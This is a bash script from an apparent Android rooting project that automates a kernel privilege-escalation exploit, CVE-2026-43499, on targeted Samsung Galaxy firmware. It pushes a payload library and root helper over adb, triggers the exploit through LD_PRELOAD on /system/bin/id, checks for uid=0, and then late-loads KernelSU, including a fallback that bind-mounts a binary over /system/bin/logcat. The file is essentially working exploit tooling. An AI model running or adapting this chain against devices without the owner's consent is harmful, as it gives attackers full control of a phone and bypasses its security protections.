#!/usr/bin/env bash
# reroot.sh - one-click re-root for Root-My-Galaxy (CVE-2026-43499) targets.
#
# Re-establishes the per-boot temporary root and (optionally) late-loads
# KernelSU through the same shell-domain path the RMG app's Shizuku mode uses:
#   LD_PRELOAD=<payload> CVE43499_ROOT_HELPER=<helper> /system/bin/id
#
# Usage:
#   tools/reroot.sh [--target NAME] [--attempts N] [--serial SERIAL]
#                   [--no-ksu] [--force] [--dry-run]
#
# Defaults to TARGET=pa3q-S938NKSUACZF1 (the Makefile default); pass
# --target/TARGET for any other profile in src/targets/.
# Override the exploit attempts with --attempts (default 8); the exploit is
# probabilistic and a failed batch normally means "reboot and retry".
set -euo pipefail

TARGET="${TARGET:-pa3q-S938NKSUACZF1}"
ATTEMPTS="${EXPLOIT_ATTEMPTS:-8}"
P0_TIMEOUT="${P0_ATTEMPT_TIMEOUT_SEC:-45}"
ATTEMPT_TIMEOUT="${EXPLOIT_ATTEMPT_TIMEOUT_SEC:-120}"
RUN_TIMEOUT="${RUN_TIMEOUT:-1800}"
SERIAL="${ANDROID_SERIAL:-}"
DO_KSU=1
FORCE=0
DRY_RUN=0

DEST=/data/local/tmp
PAYLOAD_NAME=cve-2026-43499-app.so
HELPER_NAME=cve-2026-43499-root
KSUD_NAME=ksud-s25u-kdp
PAYLOAD_DST="$DEST/$PAYLOAD_NAME"
HELPER_DST="$DEST/$HELPER_NAME"
KSUD_DST="$DEST/$KSUD_NAME"
STAGE_DST="$DEST/.ksud-stage"
SOCK_DST="$DEST/temp_su.sock"

usage() {
  cat <<'USAGE'
reroot.sh - one-click re-root for Root-My-Galaxy (CVE-2026-43499) targets.

Re-establishes the per-boot temporary root and (optionally) late-loads KernelSU
through the same shell-domain path the RMG app's Shizuku mode uses:
  LD_PRELOAD=<payload> CVE43499_ROOT_HELPER=<helper> /system/bin/id

Usage:
  tools/reroot.sh [--target NAME] [--attempts N] [--serial SERIAL]
                  [--no-ksu] [--force] [--dry-run]

Defaults to TARGET=pa3q-S938NKSUACZF1 (the Makefile default); pass
--target for any other profile in src/targets/.
The exploit is probabilistic; a failed batch normally means "reboot and retry".
USAGE
  exit "${1:-0}"
}

step() { printf '\n\033[1;36m==> %s\033[0m\n' "$*"; }
info() { printf '    %s\n' "$*"; }
warn() { printf '\033[1;33m    warn: %s\033[0m\n' "$*" >&2; }
die()  { printf '\033[1;31merror:\033[0m %s\n' "$*" >&2; exit 1; }

while [ $# -gt 0 ]; do
  case "$1" in
    --target)   TARGET="$2"; shift 2 ;;
    --attempts) ATTEMPTS="$2"; shift 2 ;;
    --serial)   SERIAL="$2"; shift 2 ;;
    --no-ksu)   DO_KSU=0; shift ;;
    --force)    FORCE=1; shift ;;
    --dry-run)  DRY_RUN=1; shift ;;
    -h|--help)  usage 0 ;;
    *)          printf 'unknown option: %s\n' "$1" >&2; usage 2 ;;
  esac
done

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TARGET_H="$REPO_ROOT/src/targets/$TARGET/target.h"
[ -f "$TARGET_H" ] || die "target.h not found for TARGET=$TARGET ($TARGET_H)"

resolve_artifact() {
  local name="$1" d
  for d in "$REPO_ROOT/build/$TARGET" "$REPO_ROOT/artifacts/$TARGET"; do
    if [ -f "$d/$name" ]; then
      printf '%s\n' "$d/$name"
      return 0
    fi
  done
  return 1
}

PAYLOAD_SRC="$(resolve_artifact "$PAYLOAD_NAME")" \
  || die "missing $PAYLOAD_NAME; build it first: make all TARGET=$TARGET ANDROID_NDK_HOME=<ndk>"
HELPER_SRC="$(resolve_artifact "$HELPER_NAME")" \
  || die "missing $HELPER_NAME; build it first: make all TARGET=$TARGET ANDROID_NDK_HOME=<ndk>"
KSUD_SRC="$REPO_ROOT/kernelsu/$KSUD_NAME"
[ "$DO_KSU" -eq 0 ] || [ -f "$KSUD_SRC" ] || die "missing $KSUD_SRC"

ADB=(adb)
[ -n "$SERIAL" ] && ADB=(adb -s "$SERIAL")

EXPECT_FP="$(sed -n 's/^#define BUILD_FINGERPRINT "\(.*\)"$/\1/p' "$TARGET_H" | head -1)"
[ -n "$EXPECT_FP" ] || die "BUILD_FINGERPRINT not found in $TARGET_H"
EXPECT_PDA="$(printf '%s' "$EXPECT_FP" | awk -F/ '{print $5}' | cut -d: -f1 | cut -d_ -f1)"

step "Target: $TARGET"
info "fingerprint : $EXPECT_FP"
info "PDA         : $EXPECT_PDA"
info "payload     : $PAYLOAD_SRC"
info "helper      : $HELPER_SRC"
[ "$DO_KSU" -eq 0 ] || info "ksud        : $KSUD_SRC"

if [ "$DRY_RUN" -eq 1 ]; then
  step "DRY RUN - commands that would be executed"
  cat <<EOF
${ADB[*]} get-state
${ADB[*]} push "$PAYLOAD_SRC" "$PAYLOAD_DST"
${ADB[*]} push "$HELPER_SRC" "$HELPER_DST"
${ADB[*]} shell "chmod 755 $PAYLOAD_DST $HELPER_DST"
${ADB[*]} push "$KSUD_SRC" "$KSUD_DST"        # when KernelSU step enabled
${ADB[*]} shell "rm -f $SOCK_DST"
${ADB[*]} shell "CVE43499_ROOT_HELPER=$HELPER_DST EXPLOIT_ATTEMPTS=$ATTEMPTS \
  P0_ATTEMPT_TIMEOUT_SEC=$P0_TIMEOUT EXPLOIT_ATTEMPT_TIMEOUT_SEC=$ATTEMPT_TIMEOUT \
  LD_PRELOAD=$PAYLOAD_DST /system/bin/id"
${ADB[*]} shell "$HELPER_DST -c id"
${ADB[*]} shell "$HELPER_DST -c 'echo 1 > /proc/sys/kernel/kptr_restrict; \
  cp $KSUD_DST $STAGE_DST && chmod 755 $STAGE_DST'"
${ADB[*]} shell "$HELPER_DST --late-load"     # tried first; falls back when unsupported
${ADB[*]} shell "$HELPER_DST -c 'unshare -m /system/bin/sh -c \"mount -o bind \
  $KSUD_DST /system/bin/logcat && /system/bin/logcat late-load \
  --package-name me.weishu.kernelsu\"'"
EOF
  exit 0
fi

step "Checking device"
"${ADB[@]}" get-state >/dev/null 2>&1 || die "no adb device; check USB and 'adb devices'"

if [ "$("${ADB[@]}" shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" != "1" ]; then
  info "waiting for boot to complete"
  for _ in $(seq 1 120); do
    [ "$("${ADB[@]}" shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" = "1" ] && break
    sleep 2
  done
fi

MODEL="$("${ADB[@]}" shell getprop ro.product.model | tr -d '\r')"
FP="$("${ADB[@]}" shell getprop ro.build.fingerprint | tr -d '\r')"
KREL="$("${ADB[@]}" shell uname -r | tr -d '\r')"
info "model    : $MODEL"
info "kernel   : $KREL"
info "fingerpr : $FP"

if [ "$FP" != "$EXPECT_FP" ]; then
  warn "device fingerprint does not match $TARGET"
  [ "$FORCE" -eq 1 ] || die "refusing to continue (pass --force to override)"
fi
case "$KREL" in
  *"$EXPECT_PDA"*) : ;;
  *) warn "kernel release does not contain $EXPECT_PDA"
     [ "$FORCE" -eq 1 ] || die "refusing to continue (pass --force to override)" ;;
esac

if "${ADB[@]}" shell 'cat /proc/modules 2>/dev/null' | grep -q '^kernelsu '; then
  info "KernelSU module is already loaded on this boot"
  if "${ADB[@]}" shell 'su -c id' 2>/dev/null | grep -q 'uid=0'; then
    info "root already available via KernelSU su; nothing to do"
    exit 0
  fi
  info "module loaded but su is not answering; continuing with the exploit"
fi

step "Pushing payload and helper"
"${ADB[@]}" push "$PAYLOAD_SRC" "$PAYLOAD_DST" >/dev/null
"${ADB[@]}" push "$HELPER_SRC" "$HELPER_DST" >/dev/null
"${ADB[@]}" shell "chmod 755 $PAYLOAD_DST $HELPER_DST"
info "pushed $(basename "$PAYLOAD_SRC") and $(basename "$HELPER_SRC")"

if [ "$DO_KSU" -eq 1 ]; then
  "${ADB[@]}" push "$KSUD_SRC" "$KSUD_DST" >/dev/null
  "${ADB[@]}" shell "chmod 755 $KSUD_DST"
  info "pushed $(basename "$KSUD_SRC")"
fi

step "Running exploit (shell domain, attempts=$ATTEMPTS)"
"${ADB[@]}" shell "rm -f $SOCK_DST" >/dev/null 2>&1 || true
LOG="$(mktemp -t reroot.XXXXXX.log)"
set +e
timeout "$RUN_TIMEOUT" "${ADB[@]}" shell \
  "CVE43499_ROOT_HELPER=$HELPER_DST EXPLOIT_ATTEMPTS=$ATTEMPTS \
   P0_ATTEMPT_TIMEOUT_SEC=$P0_TIMEOUT EXPLOIT_ATTEMPT_TIMEOUT_SEC=$ATTEMPT_TIMEOUT \
   LD_PRELOAD=$PAYLOAD_DST /system/bin/id" 2>&1 | tee "$LOG"
run_rc="${PIPESTATUS[0]}"
set -e
if [ "$run_rc" -eq 124 ]; then
  die "exploit run timed out after ${RUN_TIMEOUT}s (log: $LOG); reboot the phone and retry"
fi
if ! grep -aq 'exploit completed' "$LOG"; then
  die "exploit did not complete (log: $LOG). Failures are normal; reboot the phone and retry."
fi
info "exploit completed (log: $LOG)"

step "Verifying temporary root"
ROOT_OK=0
for _ in $(seq 1 30); do
  OUT="$("${ADB[@]}" shell "$HELPER_DST -c id" 2>&1 || true)"
  if printf '%s' "$OUT" | grep -q 'uid=0'; then
    info "$OUT"
    ROOT_OK=1
    break
  fi
  sleep 0.5
done
[ "$ROOT_OK" -eq 1 ] || die "root daemon did not answer after the exploit; reboot and retry"

if [ "$DO_KSU" -eq 0 ]; then
  step "Done - temporary root only (--no-ksu)"
  exit 0
fi

step "Loading KernelSU (late-load)"
"${ADB[@]}" shell "$HELPER_DST -c 'echo 1 > /proc/sys/kernel/kptr_restrict; \
  cp $KSUD_DST $STAGE_DST && chmod 755 $STAGE_DST'" >/dev/null
info "staged $STAGE_DST"

ksu_loaded() { "${ADB[@]}" shell 'cat /proc/modules 2>/dev/null' | grep -q '^kernelsu '; }

cleanup_logcat_mount() {
  # The shell fallback's bind mount can propagate into the global namespace
  # (toybox mount has no --make-rprivate); remove it if it leaked.
  if "${ADB[@]}" shell 'grep -q " /system/bin/logcat " /proc/mounts' 2>/dev/null; then
    info "removing leaked /system/bin/logcat bind mount"
    "${ADB[@]}" shell 'su -c "umount /system/bin/logcat"' >/dev/null 2>&1 \
      || "${ADB[@]}" shell "$HELPER_DST -c 'umount /system/bin/logcat'" >/dev/null 2>&1 \
      || true
  fi
}

if ksu_loaded; then
  info "KernelSU already loaded"
elif "${ADB[@]}" shell "$HELPER_DST --late-load" >/dev/null 2>&1 && ksu_loaded; then
  info "late-load via helper succeeded"
else
  info "helper --late-load failed; using bind-mount fallback"
  "${ADB[@]}" shell "$HELPER_DST -c 'echo 1 > /proc/sys/kernel/kptr_restrict; \
    cp $KSUD_DST $STAGE_DST && chmod 755 $STAGE_DST'" >/dev/null
  "${ADB[@]}" shell "$HELPER_DST -c 'unshare -m /system/bin/sh -c \
    \"mount -o bind $KSUD_DST /system/bin/logcat && /system/bin/logcat late-load \
    --package-name me.weishu.kernelsu\"'" >/dev/null 2>&1 || true
fi

cleanup_logcat_mount

# KernelSU's policy install can bounce adbd for a moment.
sleep 2
timeout 90 "${ADB[@]}" wait-for-device >/dev/null 2>&1 || true

if ksu_loaded; then
  info "KernelSU module loaded"
  SU_OUT="$("${ADB[@]}" shell 'su -c id' 2>&1 | head -1 || true)"
  if printf '%s' "$SU_OUT" | grep -q 'uid=0'; then
    info "$SU_OUT"
  else
    warn "KernelSU loaded but 'su -c id' did not report uid=0 (manager may need to grant shell)"
  fi
  step "Done - temporary root + KernelSU (per-boot)"
else
  die "KernelSU did not load; temporary root is still active for this boot"
fi
